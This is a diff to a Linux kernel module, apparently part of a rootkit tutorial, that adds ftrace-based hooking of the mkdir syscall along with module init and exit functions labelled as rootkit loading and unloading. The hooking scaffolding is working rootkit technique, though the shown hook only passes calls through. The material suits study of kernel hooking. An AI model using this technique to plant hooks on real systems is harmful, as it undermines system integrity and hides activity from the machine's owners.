@@ -5,6 +5,8 @@
 #include <linux/version.h>
 #include <linux/namei.h>
 
+#include "ftrace_helper.h"
+
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("TheXcellerator");
 MODULE_DESCRIPTION("mkdir syscall hook");
@@ -30,7 +32,6 @@ asmlinkage int hook_mkdir(const struct pt_regs *regs)
     orig_mkdir(regs);
     return 0;
 }
-
 #else
 static asmlinkage long (*orig_mkdir)(const char __user *pathname, umode_t mode);
 
@@ -48,4 +49,26 @@ asmlinkage int hook_mkdir(const char __user *pathname, umode_t mode)
 }
 #endif
 
-/* init and exit functions where the hooking will happen later */
+static struct ftrace_hook hooks[] = {
+    HOOK("sys_mkdir", hook_mkdir, &orig_mkdir),
+};
+
+static int __init rootkit_init(void)
+{
+    int err;
+    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
+    if(err)
+        return err;
+
+    printk(KERN_INFO "rootkit: loaded\n");
+    return 0;
+}
+
+static void __exit rootkit_exit(void)
+{
+    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
+    printk(KERN_INFO "rootkit: unloaded\n");
+}
+
+module_init(rootkit_init);
+module_exit(rootkit_exit);
